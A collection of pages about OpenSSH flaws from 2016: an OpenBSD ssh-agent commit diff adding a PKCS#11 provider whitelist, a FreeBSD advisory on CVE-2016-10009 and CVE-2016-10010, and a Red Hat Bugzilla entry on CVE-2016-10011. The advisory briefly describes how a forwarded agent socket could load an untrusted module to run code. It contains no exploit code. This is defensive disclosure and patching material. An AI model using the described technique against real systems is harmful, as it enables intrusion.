[View file](/openbsd/src/blob/9476ce1dd37d3c3218d5640b74c34c65e5f4efe5/usr.bin/ssh/ssh-agent.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,4 +1,4 @@ |
|  |  | /\* $OpenBSD: ssh-agent.c,v 1.214 2016/09/12 01:22:38 deraadt Exp $ \*/ |
|  |  | /\* $OpenBSD: ssh-agent.c,v 1.215 2016/11/30 03:07:37 djm Exp $ \*/ |
|  |  | /\* |
|  |  | \* Author: Tatu Ylonen <ylo@cs.hut.fi> |
|  |  | \* Copyright (c) 1995 Tatu Ylonen <ylo@cs.hut.fi>, Espoo, Finland |
| Expand Down  Expand Up | | @@ -69,11 +69,16 @@ |
|  |  | #include "misc.h" |
|  |  | #include "digest.h" |
|  |  | #include "ssherr.h" |
|  |  | #include "match.h" |
|  |  |  |
|  |  | #ifdef ENABLE\_PKCS11 |
|  |  | #include "ssh-pkcs11.h" |
|  |  | #endif |
|  |  |  |
|  |  | #ifndef DEFAULT\_PKCS11\_WHITELIST |
|  |  | # define DEFAULT\_PKCS11\_WHITELIST "/usr/lib/\*,/usr/local/lib/\*" |
|  |  | #endif |
|  |  |  |
|  |  | typedef enum { |
|  |  | AUTH\_UNUSED, |
|  |  | AUTH\_SOCKET, |
| Expand Down  Expand Up | | @@ -121,6 +126,9 @@ pid\_t cleanup\_pid = 0; |
|  |  | char socket\_name[PATH\_MAX]; |
|  |  | char socket\_dir[PATH\_MAX]; |
|  |  |  |
|  |  | /\* PKCS#11 path whitelist \*/ |
|  |  | static char \*pkcs11\_whitelist; |
|  |  |  |
|  |  | /\* locking \*/ |
|  |  | #define LOCK\_SIZE 32 |
|  |  | #define LOCK\_SALT\_SIZE 16 |
| Expand Down  Expand Up | | @@ -724,7 +732,7 @@ no\_identities(SocketEntry \*e, u\_int type) |
|  |  | static void |
|  |  | process\_add\_smartcard\_key(SocketEntry \*e) |
|  |  | { |
|  |  | char \*provider = NULL, \*pin; |
|  |  | char \*provider = NULL, \*pin, canonical\_provider[PATH\_MAX]; |
|  |  | int r, i, version, count = 0, success = 0, confirm = 0; |
|  |  | u\_int seconds; |
|  |  | time\_t death = 0; |
| Expand Down  Expand Up | | @@ -756,19 +764,30 @@ process\_add\_smartcard\_key(SocketEntry \*e) |
|  |  | goto send; |
|  |  | } |
|  |  | } |
|  |  | if (realpath(provider, canonical\_provider) == NULL) { |
|  |  | verbose("failed PKCS#11 add of \"%.100s\": realpath: %s", |
|  |  | provider, strerror(errno)); |
|  |  | goto send; |
|  |  | } |
|  |  | if (match\_pattern\_list(canonical\_provider, pkcs11\_whitelist, 0) != 1) { |
|  |  | verbose("refusing PKCS#11 add of \"%.100s\": " |
|  |  | "provider not whitelisted", canonical\_provider); |
|  |  | goto send; |
|  |  | } |
|  |  | debug("%s: add %.100s", \_\_func\_\_, canonical\_provider); |
|  |  | if (lifetime && !death) |
|  |  | death = monotime() + lifetime; |
|  |  |  |
|  |  | count = pkcs11\_add\_provider(provider, pin, &keys); |
|  |  | count = pkcs11\_add\_provider(canonical\_provider, pin, &keys); |
|  |  | for (i = 0; i < count; i++) { |
|  |  | k = keys[i]; |
|  |  | version = k->type == KEY\_RSA1 ? 1 : 2; |
|  |  | tab = idtab\_lookup(version); |
|  |  | if (lookup\_identity(k, version) == NULL) { |
|  |  | id = xcalloc(1, sizeof(Identity)); |
|  |  | id->key = k; |
|  |  | id->provider = xstrdup(provider); |
|  |  | id->comment = xstrdup(provider); /\* XXX \*/ |
|  |  | id->provider = xstrdup(canonical\_provider); |
|  |  | id->comment = xstrdup(canonical\_provider); /\* XXX \*/ |
|  |  | id->death = death; |
|  |  | id->confirm = confirm; |
|  |  | TAILQ\_INSERT\_TAIL(&tab->idlist, id, next); |
| Expand Down  Expand Up | | @@ -1157,7 +1176,7 @@ usage(void) |
|  |  | { |
|  |  | fprintf(stderr, |
|  |  | "usage: ssh-agent [-c | -s] [-Dd] [-a bind\_address] [-E fingerprint\_hash]\n" |
|  |  | " [-t life] [command [arg ...]]\n" |
|  |  | " [-P pkcs11\_whitelist] [-t life] [command [arg ...]]\n" |
|  |  | " ssh-agent [-c | -s] -k\n"); |
|  |  | exit(1); |
|  |  | } |
| Expand Down  Expand Up | | @@ -1191,7 +1210,7 @@ main(int ac, char \*\*av) |
|  |  | OpenSSL\_add\_all\_algorithms(); |
|  |  | #endif |
|  |  |  |
|  |  | while ((ch = getopt(ac, av, "cDdksE:a:t:")) != -1) { |
|  |  | while ((ch = getopt(ac, av, "cDdksE:a:P:t:")) != -1) { |
|  |  | switch (ch) { |
|  |  | case 'E': |
|  |  | fingerprint\_hash = ssh\_digest\_alg\_by\_name(optarg); |
| Expand All | | @@ -1206,6 +1225,11 @@ main(int ac, char \*\*av) |
|  |  | case 'k': |
|  |  | k\_flag++; |
|  |  | break; |
|  |  | case 'P': |
|  |  | if (pkcs11\_whitelist != NULL) |
|  |  | fatal("-P option already specified"); |
|  |  | pkcs11\_whitelist = xstrdup(optarg); |
|  |  | break; |
|  |  | case 's': |
|  |  | if (c\_flag) |
|  |  | usage(); |
| Expand Down  Expand Up | | @@ -1240,6 +1264,9 @@ main(int ac, char \*\*av) |
|  |  | if (ac > 0 && (c\_flag || k\_flag || s\_flag || d\_flag || D\_flag)) |
|  |  | usage(); |
|  |  |  |
|  |  | if (pkcs11\_whitelist == NULL) |
|  |  | pkcs11\_whitelist = xstrdup(DEFAULT\_PKCS11\_WHITELIST); |
|  |  |  |
|  |  | if (ac == 0 && !c\_flag && !s\_flag) { |
|  |  | shell = getenv("SHELL"); |
|  |  | if (shell != NULL && (len = strlen(shell)) > 2 && |
| Expand Down  Expand Up | | @@ -1385,7 +1412,7 @@ main(int ac, char \*\*av) |
|  |  | signal(SIGTERM, cleanup\_handler); |
|  |  | nalloc = 0; |
|  |  |  |
|  |  | if (pledge("stdio cpath unix id proc exec", NULL) == -1) |
|  |  | if (pledge("stdio rpath cpath unix id proc exec", NULL) == -1) |
|  |  | fatal("%s: pledge: %s", \_\_progname, strerror(errno)); |
|  |  |  |
|  |  | while (1) { |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `9476ce1`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopenbsd%2Fsrc%2Fcommit%2F9476ce1dd37d3c3218d5640b74c34c65e5f4efe5) to comment.

## Footer

 2025 GitHub,Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You cant perform that action at this time.



=== Content from packetstormsecurity.com_91d720c1_20250125_102955.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

[About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from www.redhat.com_0e1bf2c8_20250126_080200.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Franais](https://access.redhat.com/changeLanguage?language=fr)
* [](https://access.redhat.com/changeLanguage?language=ko)
* [](https://access.redhat.com/changeLanguage?language=ja)
* [ ()](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

  2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from security.FreeBSD.org_a3dc04a6_20250125_103002.html ===
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
=============================================================================
FreeBSD-SA-17:01.openssh Security Advisory
The FreeBSD Project
Topic: OpenSSH multiple vulnerabilities
Category: contrib
Module: OpenSSH
Announced: 2017-01-11
Affects: All supported versions of FreeBSD.
Corrected: 2017-01-11 05:56:40 UTC (stable/11, 11.0-STABLE)
2017-01-11 06:01:23 UTC (releng/11.0, 11.0-RELEASE-p7)
2017-01-11 05:56:40 UTC (stable/10, 10.3-STABLE)
2017-01-11 06:01:23 UTC (releng/10.3, 10.3-RELEASE-p16)
CVE Name: CVE-2016-10009, CVE-2016-10010
For general information regarding FreeBSD Security Advisories,
including descriptions of the fields above, security branches, and the
following sections, please visit .
I. Background
OpenSSH is an implementation of the SSH protocol suite, providing an
encrypted and authenticated transport for a variety of services,
including remote shell access.
OpenSSH supports accessing keys provided by a PKCS#11 token.
II. Problem Description
The ssh-agent(1) agent supports loading a PKCS#11 module from outside a
trusted whitelist. An attacker can request loading of a PKCS#11 module
across forwarded agent-socket. [CVE-2016-10009]
When privilege separation is disabled, forwarded Unix domain sockets
would be created by sshd(8) with the privileges of 'root' instead of
the authenticated user. [CVE-2016-10010]
III. Impact
A remote attacker who have control of a forwarded agent-socket on a
remote system and have the ability to write files on the system
running ssh-agent(1) agent can run arbitrary code under the same user
credential. Because the attacker must already have some control on
both systems, it is relatively hard to exploit this vulnerability in
a practical attack. [CVE-2016-10009]
When privilege separation is disabled (on FreeBSD, privilege separation
is enabled by default and has to be explicitly disabled), an authenticated
attacker can potentially gain root privileges on systems running OpenSSH
server. [CVE-2016-10010]
IV. Workaround
Systems not running ssh-agent(1) and sshd(8) services are not affected.
System administrators may remove ssh-agent(1) to mitigate CVE-2016-10009.
System administrators should enable privilege separation when running
OpenSSH server, which is the FreeBSD default, to mitigate CVE-2016-10010.
V. Solution
Perform one of the following:
1) Upgrade your vulnerable system to a supported FreeBSD stable or
release / security branch (releng) dated after the correction date.
Kill all running ssh-agent(1) process and restart sshd(8) service.
A reboot is recommended but not required.
2) To update your vulnerable system via a binary patch:
Systems running a RELEASE version of FreeBSD on the i386 or amd64
platforms can be updated via the freebsd-update(8) utility:
# freebsd-update fetch
# freebsd-update install
Kill all running ssh-agent(1) process and restart sshd(8) service.
A reboot is recommended but not required.
3) To update your vulnerable system via a source code patch:
The following patches have been verified to apply to the applicable
FreeBSD release branches.
a) Download the relevant patch from the location below, and verify the
detached PGP signature using your PGP utility.
# fetch https://security.FreeBSD.org/patches/SA-17:01/openssh.patch
# fetch https://security.FreeBSD.org/patches/SA-17:01/openssh.patch.asc
# gpg --verify openssh.patch.asc
b) Apply the patch. Execute the following commands as root:
# cd /usr/src
# patch < /path/to/patch
c) Recompile the operating system using buildworld and installworld as
described in .
Kill all running ssh-agent(1) process and restart sshd(8) service.
A reboot is recommended but not required.
VI. Correction details
The following list contains the correction revision numbers for each
affected branch.
Branch/path Revision
- -------------------------------------------------------------------------
stable/10/ r311915
releng/10.3/ r311916
stable/11/ r311915
releng/11.0/ r311916
- -------------------------------------------------------------------------
To see which files were modified by a particular revision, run the
following command, replacing NNNNNN with the revision number, on a
machine with Subversion installed:
# svn diff -cNNNNNN --summarize svn://svn.freebsd.org/base
Or visit the following URL, replacing NNNNNN with the revision number:
VII. References
The latest revision of this advisory is available at
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2.1.16 (FreeBSD)
iQIzBAEBCgAdFiEEHPf/b631yp++G4yy7Wfs1l3PaucFAlh1yuAACgkQ7Wfs1l3P
auebFA//TGtwrub7JNTgKdc5qnpw+s8W1j0AnQ4wTaJ6v7zNyUB0DG+LHW4uXCwR
xc9Etd2mhY26wJIUxx0Z3oArcqVBGpCGbozuIOU6AdgmHdOL3ddj8aq4SuC0PyMA
0OvNgZIRPZxEm81MP+6/GES4JLmOumiNeAG/MrtITGJDP/K5vVPIst/+F7OJ4P2+
OGrjqBWmAz2EMG62QUJI8oSwB+FJpXtWHKOC4fPGibAQe3vF1WequbcDkLsYl1pX
Ktlk/qh9ivaQreM9rHkUDF0PYwFdsXzveze/TLNbEo+w43v/PAlyR+xw2+22VjGK
fxTL8Gk2tMQfahGZwFmmQFPLcwNRcdjgnZcRRHA3z8vKgM831A53gV3KskUwZl4V
DyKdXtl44zrZ7PtPJ1gJkPK6B8zzfjnSwzPC51pDjh30ps28Rgfc6JOyjxhX5BJ4
sXvQ3meiEfVgVq3DpTqQ3mZVQ1pRF+yhPf1Ptts9fQzAD95JsFF0WT0nzbYoB2VY
KrU4V7d/Ys+HIeQWgDwZlFuLOULlVZDW/H55PT5Tx9JvP5vRlZS/w2HHN7wwy8n5
tNX9mcH8DuG7X/jWDR9ompbJp5uZqcKWVMHPQY7fnaLSJoQMqrpPgZ9tsw6wq347
Vslm3qQwUTSGRagH0rBuHiVJmY/AeqY3lvsaZklWGIYMRjmUeA0=
=3z/p
-----END PGP SIGNATURE-----


=== Content from bugzilla.redhat.com_1e7fc4a0_20250126_080205.html ===


* Login
  + Log in using an SSO provider:- [Fedora Account System](saml2_login.cgi?idp=Fedora%20Account%20System&target=show_bug.cgi%3Fid%3D1406286)
    - [Red Hat Associate](saml2_login.cgi?idp=Red%20Hat%20Associate&target=show_bug.cgi%3Fid%3D1406286)
    - [Red Hat Customer](saml2_login.cgi?idp=Red%20Hat%20Customer&target=show_bug.cgi%3Fid%3D1406286)+ Login using a Red Hat Bugzilla account
  + ForgotPassword
  + [Create an Account](createaccount.cgi)

Red Hat Bugzilla  Bug1406286

* [Home](./)
* [New](enter_bug.cgi)
* Search
  + [Simple Search](query.cgi?format=specific)
  + [Advanced Search](query.cgi?format=advanced)
* My Links
  + [Browse](describecomponents.cgi)
  + [Requests](request.cgi)
  + Reports
  + Current State
    - [Search](query.cgi)
    - [Tabular reports](query.cgi?format=report-table)
    - [Graphical reports](query.cgi?format=report-graph)
    - [Duplicates](duplicates.cgi)
  + Other Reports
    - [User Changes](https://bugzilla.redhat.com/page.cgi?id=user_activity.html)
  + Plotly Reports
    - [Bug Status](https://bugzilla.redhat.com/page.cgi?id=bug_status.html)
    - [Bug Severity](https://bugzilla.redhat.com/page.cgi?id=bug_severity.html)
    - [Non-Defaults](https://bugzilla.redhat.com/page.cgi?id=non_defaults.html)
* [Product Dashboard](page.cgi?id=productdashboard.html)

- Help
  * [Page Help!](docs/en/html/using/understanding.html)
  * [Bug Writing Guidelines](page.cgi?id=bug-writing.html)
  * [What's new](page.cgi?id=whats-new.html)
  * [Browser Support Policy](https://access.redhat.com/help/browsers)
  * [5.0.4.rh103 Release notes](page.cgi?id=release-notes.html)
  * [FAQ](page.cgi?id=faq.html)
  * [Guides index](docs/en/html/index.html)
  * [User guide](docs/en/html/using/index.html)
  * [Web Services](docs/en/html/integrating/api/Bugzilla/WebService/Bug.html)
  * [Contact](page.cgi?id=redhat/contact.html)
  * [Legal](page.cgi?id=terms-conditions.html)
- [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")

This site requires JavaScript to be enabled to function correctly, please enable it.

[**Bug1406286**](show_bug.cgi?id=1406286)
(CVE-2016-10011)
- [CVE-2016-10011](https://access.redhat.com/security/cve/CVE-2016-10011) openssh: Leak of host private key material to privilege-separated child process via realloc()

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
CVE-2016-10011 openssh: Leak of host private key material to privilege-separa...

| | [Keywords](describekeywords.cgi): | Security | | --- | --- | | [Status](page.cgi?id=fields.html#bug_status): | CLOSED WONTFIX | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2016-10011 | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | Security Response | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Other | | [Component:](describecomponents.cgi?product=Security Response "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | vulnerability | | [Sub Component:](page.cgi?id=fields.html#rh_sub_components "The sub component of a specific component") | --- | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All | | [OS:](page.cgi?id=fields.html#op_sys "The operating system the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Linux | | [Priority:](page.cgi?id=fields.html#priority) | low | | [Severity:](page.cgi?id=fields.html#bug_severity) | low | | [Target Milestone:](page.cgi?id=fields.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Red Hat Product Security | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") |  | | [Docs Contact:](page.cgi?id=fields.html#docs_contact "The person responsible for documenting once the bug has been resolved.") |  | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Depends On:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") | [1406296](show_bug.cgi?id=1406296 "CLOSED ERRATA - CVE-2016-10009 CVE-2016-10010 CVE-2016-10011 CVE-2016-10012 openssh: various flaws [fedora-all]") [1794511](show_bug.cgi?id=1794511) | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") | [1406299](show_bug.cgi?id=1406299) [1415638](show_bug.cgi?id=1415638) | | TreeView+ | [depends on](buglist.cgi?bug_id=1406286&bug_id_type=anddependson&format=tvp) / [blocked](buglist.cgi?bug_id=1406286&bug_id_type=andblocked&format=tvp&tvp_dir=blocked) |  | |  | | [Reported:](page.cgi?id=fields.html#reporter) | 2016-12-20 08:25 UTC by Andrej Nemec | | --- | --- | | [Modified:](page.cgi?id=fields.html#modified) | 2021-02-17 02:51 UTC ([History](show_activity.cgi?id=1406286)) | | [CC List:](page.cgi?id=fields.html#cclist) | 8 users (show)  jjelen mattias.ellert mgrepl plautrba sardella slawomir tmraz yozone | | Fixed In Version: | openssh 7.4 | | | Doc Type: | If docs needed, set a value | | | Doc Text: | It was found that the host private key material could possibly leak to the privilege-separated child processes via re-allocated memory. An attacker able to compromise the privilege-separated process could therefore obtain the leaked key information. | | | Clone Of: |  | | | Environment: |  | | | Last Closed: | 2017-01-16 06:11:30 UTC | | | Embargoed: |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | [(Terms of Use)](page.cgi?id=terms-conditions.html) | | | --- | --- | --- | |  | | |    Links | System | ID | Private | Priority | Status | Summary | Last Updated | | Red Hat Product Errata | [RHSA-2017:2029](https://access.redhat.com/errata/RHSA-2017%3A2029) | 0 | normal | SHIPPED\_LIVE | Moderate: openssh security, bug fix, and enhancement update | 2017-08-01 18:11:55 UTC | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=1406286#c0)  Andrej Nemec    2016-12-20 08:25:06 UTC  ```  It was found that there is a theoretical leak of host private key material to privilege-separated child processes via realloc() when reading keys. No such leak was observed in practice for normal-sized keys, nor does a leak to the child processes directly expose key material to unprivileged users.  CVE assignment:  <http://seclists.org/oss-sec/2016/q4/708>  External References:  <https://www.openssh.com/txt/release-7.4>   ```  [Comment 1](show_bug.cgi?id=1406286#c1)  Andrej Nemec    2016-12-20 08:38:45 UTC  ``` Upstream patch:  <http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/usr.bin/ssh/authfile.c.diff?r1=1.121&r2=1.122>   ```  [Comment 2](show_bug.cgi?id=1406286#c2)  Andrej Nemec    2016-12-20 08:41:29 UTC  ```  Created openssh tracking bugs for this issue:  Affects: fedora-all [[bug 1406296](show_bug.cgi?id=1406296 "CLOSED ERRATA - CVE-2016-10009 CVE-2016-10010 CVE-2016-10011 CVE-2016-10012 openssh: various flaws [fedora-all]")]   ```  [Comment 3](show_bug.cgi?id=1406286#c3)  Huzaifa S. Sidhpurwala    2017-01-16 06:11:30 UTC  ``` Statement:  It seems that this flaw is not practically exploitable, the leak of host private key material to the privilege-separated child processes is theoretical. No such leak was observed in practice for normal-sized keys, nor does a leak to the child processes directly expose key material to unprivileged users. Because of the this restriction for successful exploitation, this issue has been rated as having Low security impact. A future update may address this 